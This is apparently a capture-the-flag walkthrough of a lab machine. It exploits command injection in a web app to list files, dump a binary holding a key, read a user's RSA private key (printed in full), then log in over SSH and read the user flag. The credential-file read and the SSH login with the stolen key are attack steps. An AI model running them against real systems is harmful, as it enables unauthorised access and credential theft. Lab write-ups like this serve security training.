1) This Web App has a vulnerabily, Command Injection
2) I insert "ls":
```
home.jpg
home.php
image.png
index.html
index.php.bak
key_rev_key
validate.php
```
3) cat key_rev_key
```
ELF>ï¿½@ï¿½@8	@@@@ï¿½ï¿½888ï¿½
ï¿½
 ï¿½
ï¿½
 ï¿½
 xï¿½ ï¿½
ï¿½
 ï¿½
 ï¿½ï¿½TTTDDPï¿½tdï¿½	ï¿½	ï¿½	<<Qï¿½tdRï¿½tdï¿½
ï¿½
 ï¿½
 hh/lib64/ld-linux-x86-64.so.2GNUGNUï¿½sï¿½Å—5
tzï¿½~ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ 0MFï¿½ ï¿½ 7"libc.so.6__isoc99_scanfputs__stack_chk_failprintf__cxa_finalizestrcmp__libc_start_mainGLIBC_2.7GLIBC_2.4GLIBC_2.2.5_ITM_deregisterTMCloneTable__gmon_start___ITM_registerTMCloneTableii
_ii
iui	sï¿½
 ï¿½ï¿½
 `  ï¿½ ï¿½ ï¿½ ï¿½ 	ï¿½ 
ï¿½ ï¿½ ï¿½ ï¿½ ï¿½ Hï¿½ï¿½Hï¿½ï¿½	 Hï¿½ï¿½tï¿½ï¿½Hï¿½ï¿½ï¿½ï¿½5j	 ï¿½%l	 @ï¿½%j	 hï¿½ï¿½ï¿½ï¿½ï¿½ï¿½%b	 hï¿½ï¿½ï¿½ï¿½ï¿½ï¿½%Z	 hï¿½ï¿½ï¿½ï¿½ï¿½ï¿½%R	 hï¿½ï¿½ï¿½ï¿½ï¿½%J	 hï¿½ï¿½ï¿½ï¿½ï¿½%b	 fï¿½1ï¿½Iï¿½ï¿½^Hï¿½ï¿½Hï¿½ï¿½ï¿½PTLï¿½*Hï¿½
ï¿½Hï¿½=ï¿½ï¿½	 ï¿½DHï¿½=9	 UHï¿½1	 H9ï¿½Hï¿½ï¿½tHï¿½ï¿½ Hï¿½ï¿½t
]ï¿½ï¿½f.ï¿½]ï¿½@f.ï¿½Hï¿½=ï¿½ Hï¿½5ï¿½ UH)ï¿½Hï¿½ï¿½Hï¿½ï¿½Hï¿½ï¿½Hï¿½ï¿½?Hï¿½Hï¿½ï¿½tHï¿½ï¿½ Hï¿½ï¿½t]ï¿½ï¿½fï¿½]ï¿½@f.ï¿½ï¿½=ï¿½ u/Hï¿½=ï¿½ UHï¿½ï¿½tHï¿½=ï¿½ ï¿½
ï¿½ï¿½ï¿½ï¿½Hï¿½ï¿½ï¿½ï¿½ï¿½ ]ï¿½ï¿½ï¿½ï¿½fDUHï¿½ï¿½]ï¿½fï¿½ï¿½ï¿½UHï¿½ï¿½Hï¿½ï¿½@ï¿½}ï¿½Hï¿½uï¿½dHï¿½%(Hï¿½Eï¿½1ï¿½Hï¿½=)ï¿½ï¿½ï¿½ï¿½ï¿½Hï¿½Eï¿½Hï¿½ï¿½Hï¿½=#ï¿½ï¿½ï¿½ï¿½ï¿½Hï¿½Eï¿½Hï¿½5Hï¿½ï¿½ï¿½lï¿½ï¿½ï¿½ï¿½ï¿½u5Hï¿½=	ï¿½ï¿½Gï¿½ï¿½ï¿½Hï¿½=(ï¿½ï¿½6ï¿½ï¿½ï¿½Hï¿½=Gï¿½ï¿½%ï¿½ï¿½ï¿½ï¿½Hï¿½=Dï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Hï¿½Uï¿½dH3%(tï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½f.ï¿½fï¿½AWAVIï¿½ï¿½AUATLï¿½% UHï¿½- SAï¿½ï¿½Iï¿½ï¿½L)ï¿½Hï¿½ï¿½Hï¿½ï¿½ï¿½wï¿½ï¿½ï¿½Hï¿½ï¿½t 1ï¿½ï¿½Lï¿½ï¿½Lï¿½ï¿½Dï¿½ï¿½Aï¿½ï¿½Hï¿½ï¿½H9ï¿½uï¿½Hï¿½ï¿½[]A\A]A^A_Ãf.ï¿½ï¿½ï¿½Hï¿½ï¿½Hï¿½ï¿½ï¿½Enter your name: %slaksdhfas
 congratulations you have found the key:   b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
 Keep its safeBad name!;8ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Tï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Lï¿½ï¿½ï¿½,zRxï¿½ï¿½ï¿½ï¿½ï¿½+zRxï¿½$ï¿½ï¿½ï¿½`FJwï¿½?;*3$"DHï¿½ï¿½ï¿½\Jï¿½ï¿½ï¿½ï¿½Aï¿½C
ï¿½D|ï¿½ï¿½ï¿½ï¿½eBï¿½Bï¿½E ï¿½B(ï¿½H0ï¿½H8ï¿½M@r8A0A(B BBBï¿½ï¿½ï¿½ï¿½ï¿½`
ï¿½ï¿½
 ï¿½
 ï¿½ï¿½ï¿½oï¿½ï¿½ï¿½
ï¿½ï¿½ xï¿½ï¿½ï¿½	ï¿½ï¿½ï¿½oï¿½ï¿½ï¿½oï¿½ï¿½ï¿½ï¿½oï¿½ï¿½ï¿½oï¿½ï¿½ï¿½ï¿½oï¿½
 FVfvï¿½ GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.08Ttï¿½ï¿½ï¿½ï¿½ï¿½	ï¿½
ï¿½0
ï¿½ï¿½ï¿½ï¿½ï¿½	ï¿½	ï¿½
 ï¿½
 ï¿½
 ï¿½   ï¿½ï¿½ï¿½!`7 Fï¿½
 mï¿½yï¿½
 ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
ï¿½ï¿½ï¿½ï¿½
 ï¿½ï¿½
 ï¿½ï¿½
 ï¿½ï¿½	ï¿½ï¿½ ï¿½ ï¿½  2D ï¿½Kg{ï¿½ ï¿½ï¿½ ï¿½ ï¿½ï¿½ï¿½peï¿½ ï¿½ï¿½+ï¿½ ï¿½ï¿½! - G"ï¿½crtstuff.cderegister_tm_clones__do_global_dtors_auxcompleted.7698__do_global_dtors_aux_fini_array_entryframe_dummy__frame_dummy_init_array_entrylicense.c__FRAME_END____init_array_end_DYNAMIC__init_array_start__GNU_EH_FRAME_HDR_GLOBAL_OFFSET_TABLE___libc_csu_fini_ITM_deregisterTMCloneTableputs@@GLIBC_2.2.5_edata__stack_chk_fail@@GLIBC_2.4printf@@GLIBC_2.2.5__libc_start_main@@GLIBC_2.2.5__data_startstrcmp@@GLIBC_2.2.5__gmon_start____dso_handle_IO_stdin_used__libc_csu_init__bss_startmain__isoc99_scanf@@GLIBC_2.7__TMC_END___ITM_registerTMCloneTable__cxa_finalize@@GLIBC_2.2.5.symtab.strtab.shstrtab.interp.note.ABI-tag.note.gnu.build-id.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rela.dyn.rela.plt.init.plt.got.text.fini.rodata.eh_frame_hdr.eh_frame.init_array.fini_array.dynamic.data.bss.comment88#TT 1tt$Dï¿½ï¿½ï¿½oï¿½ï¿½Nï¿½ï¿½Vï¿½ï¿½ï¿½^ï¿½ï¿½ï¿½oï¿½ï¿½kï¿½ï¿½ï¿½oï¿½ï¿½@zï¿½ï¿½ï¿½ï¿½Bï¿½ï¿½xï¿½ï¿½00`ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Bï¿½ï¿½ï¿½	ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½	ï¿½	<ï¿½ï¿½	ï¿½	ï¿½ï¿½
 ï¿½
ï¿½ï¿½
 ï¿½
ï¿½ï¿½
 ï¿½
ï¿½ï¿½ï¿½ ï¿½hï¿½ ï¿½ ï¿½0)@H+	ï¿½cï¿½ï¿½
```

4) I discover the key: b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
5)   Enter the key you found!  : b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
6) I get from  command injetion the id_rsa of charlie: cat /home/charlie/teleport

```
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA4adrPc3Uh98RYDrZ8CUBDgWLENUybF60lMk9YQOBDR+gpuRW
1AzL12K35/Mi3Vwtp0NSwmlS7ha4y9sv2kPXv8lFOmLi1FV2hqlQPLw/unnEFwUb
L4KBqBemIDefV5pxMmCqqguJXIkzklAIXNYhfxLr8cBS/HJoh/7qmLqrDoXNhwYj
B3zgov7RUtk15Jv11D0Itsyr54pvYhCQgdoorU7l42EZJayIomHKon1jkofd1/oY
fOBwgz6JOlNH1jFJoyIZg2OmEhnSjUltZ9mSzmQyv3M4AORQo3ZeLb+zbnSJycEE
RaObPlb0dRy3KoN79lt+dh+jSg/dM/TYYe5L4wIDAQABAoIBAD2TzjQDYyfgu4Ej
Di32Kx+Ea7qgMy5XebfQYquCpUjLhK+GSBt9knKoQb9OHgmCCgNG3+Klkzfdg3g9
zAUn1kxDxFx2d6ex2rJMqdSpGkrsx5HwlsaUOoWATpkkFJt3TcSNlITquQVDe4tF
w8JxvJpMs445CWxSXCwgaCxdZCiF33C0CtVw6zvOdF6MoOimVZf36UkXI2FmdZFl
kR7MGsagAwRn1moCvQ7lNpYcqDDNf6jKnx5Sk83R5bVAAjV6ktZ9uEN8NItM/ppZ
j4PM6/IIPw2jQ8WzUoi/JG7aXJnBE4bm53qo2B4oVu3PihZ7tKkLZq3Oclrrkbn2
EY0ndcECgYEA/29MMD3FEYcMCy+KQfEU2h9manqQmRMDDaBHkajq20KvGvnT1U/T
RcbPNBaQMoSj6YrVhvgy3xtEdEHHBJO5qnq8TsLaSovQZxDifaGTaLaWgswc0biF
uAKE2uKcpVCTSewbJyNewwTljhV9mMyn/piAtRlGXkzeyZ9/muZdtesCgYEA4idA
KuEj2FE7M+MM/+ZeiZvLjKSNbiYYUPuDcsoWYxQCp0q8HmtjyAQizKo6DlXIPCCQ
RZSvmU1T3nk9MoTgDjkNO1xxbF2N7ihnBkHjOffod+zkNQbvzIDa4Q2owpeHZL19
znQV98mrRaYDb5YsaEj0YoKfb8xhZJPyEb+v6+kCgYAZwE+vAVsvtCyrqARJN5PB
la7Oh0Kym+8P3Zu5fI0Iw8VBc/Q+KgkDnNJgzvGElkisD7oNHFKMmYQiMEtvE7GB
FVSMoCo/n67H5TTgM3zX7qhn0UoKfo7EiUR5iKUAKYpfxnTKUk+IW6ME2vfJgsBg
82DuYPjuItPHAdRselLyNwKBgH77Rv5Ml9HYGoPR0vTEpwRhI/N+WaMlZLXj4zTK
37MWAz9nqSTza31dRSTh1+NAq0OHjTpkeAx97L+YF5KMJToXMqTIDS+pgA3fRamv
ySQ9XJwpuSFFGdQb7co73ywT5QPdmgwYBlWxOKfMxVUcXybW/9FoQpmFipHsuBjb
Jq4xAoGBAIQnMPLpKqBk/ZV+HXmdJYSrf2MACWwL4pQO9bQUeta0rZA6iQwvLrkM
Qxg3lN2/1dnebKK5lEd2qFP1WLQUJqypo5TznXQ7tv0Uuw7o0cy5XNMFVwn/BqQm
G2QwOAGbsQHcI0P19XgHTOB7Dm69rP9j1wIRBOF7iGfwhWdi+vln
-----END RSA PRIVATE KEY-----
```

7) Then I copy this text in a file and I change the privilegies:
```
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ nano id_rsa 
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ chmod 600 id_rsa
```

8) After I do login with ssh:
```
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ ssh -i id_rsa charlie@10.10.5.181

Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-115-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Dec 13 20:39:55 UTC 2022

  System load:  0.11              Processes:           595
  Usage of /:   43.6% of 8.79GB   Users logged in:     0
  Memory usage: 60%               IP address for eth0: 10.10.5.181
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Tue Dec 13 20:24:25 2022 from 10.8.21.1
Could not chdir to home directory /home/charley: No such file or directory
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

charlie@chocolate-factory:/$ 
```

9) I take the user.txt:
```
charlie@chocolate-factory:/home/charlie$ cat user.txt
flag{cd5509042371b34e4826e4838b522d2e}
```
